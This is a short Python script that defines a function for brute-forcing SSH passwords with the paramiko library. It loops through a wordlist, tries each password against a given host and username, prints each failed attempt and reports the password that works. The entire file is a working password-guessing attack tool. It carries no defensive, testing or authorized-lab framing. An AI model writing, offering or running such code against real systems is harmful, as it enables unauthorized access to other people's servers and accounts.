import paramiko

def brute_force(host, username, wordlist_path):
    print(f"Starting SSH brute-force on {host} for user '{username}'")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(wordlist_path, 'r') as f:
            passwords = f.readlines()

        for password in passwords:
            password = password.strip()
            try:
                ssh.connect(hostname=host, username=username, password=password, timeout=3)
                print(f"[+] Password found: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Incorrect password: {password}")
            except Exception as e:
                print(f"[!] Connection failed: {e}")
    except FileNotFoundError:
        print("[-] Wordlist not found.")
